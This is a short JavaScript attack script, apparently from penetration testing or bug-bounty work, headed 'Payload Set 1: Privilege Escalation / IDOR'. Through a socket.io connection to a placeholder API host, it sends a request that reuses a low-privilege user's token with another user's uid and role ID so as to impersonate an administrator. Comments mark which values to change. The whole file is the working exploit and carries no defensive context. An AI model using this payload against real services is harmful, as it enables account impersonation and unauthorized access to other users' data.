/*
Payload Set 1: Privilege Escalation / IDOR (Horizontal Escalation)
    -> Change uid, userroleid, and token to impersonate another user (especially one with more privileges)
*/

const io = require("socket.io-client");
const socket = io("wss://api.target.com", {
  transports: ["websocket"]
});

socket.on("connect", () => {
  console.log("Connected");

  const message = [
    "apicall",
    {
      method: "POST",
      url: "https://api.target.com/v1/logindata",
      body: {
        "companyid": "67c139e06c841103c5bba25",
        "username": "admin" // Change this
      },
      headers: {
        token: "<valid_token_of_low_priv_user>",
        uid: "67c13b046c8411038c5b308", // Change this to an admin UID
        userroleid: "622ed36cbe21c85a88da9a0"
      },      
      endpoint: "v1/logindata-test"
    }
  ];

  socket.emit("apicall", message[1]);
});
